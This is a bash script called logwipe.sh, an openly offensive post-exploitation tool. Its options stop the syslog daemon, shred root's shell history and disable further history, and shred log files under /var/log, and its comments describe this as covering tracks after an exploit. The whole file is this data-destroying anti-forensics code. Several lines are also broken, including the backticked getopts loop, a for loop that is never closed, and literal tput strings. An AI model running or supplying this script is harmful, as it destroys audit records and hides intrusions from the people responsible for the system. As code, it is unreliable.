#!/bin/bash

usage() { 
    echo "Usage: logwipe.sh -hsHl"
    echo "-h - This help message"
    echo "-s - Shut down syslog daemon"
    echo "-H - Wipe history and stop history function"
    echo "-l - Wipe recent log files"
    1>&2; exit 1; }

# Script for wiping log files
while `getopts ":hsHl" arg`;
	do
        case "${arg}" in
                # usage info
                h)
                  echo "Usage: logwipe.sh -hsHl"
                  echo "-h - This help message"
                  echo "-s - Shut down syslog daemon"
                  echo "-H - Wipe history and stop history function"
                  echo "-l - Wipe recent log files"
				  exit 0
                ;;
                # Take out remote logging
                s)
                  SYSLOGINIT=`/usr/bin/find /etc/init.d -name *syslog*`
                  /bin/bash $SYSLOGINIT stop
                  echo "{tput setaf 2}Syslog daemon Stopped{tput sgr0}"
                ;;
                # Sort out history
                H)
                  /usr/bin/shred -zu /root/.bash_history
                  export HISTSIZE=0
                  echo "History stopped and wiped"
                ;;
                # Take out the recent log files if run post exploit otherwise leave
                l)
                  for log in `/usr/bin/find /var/log -name *log$*`; do `shred -zu $log`
                  echo "{tput setaf 2}Recent logs wiped{tput sgr0}"
                ;;
        esac
	done
	
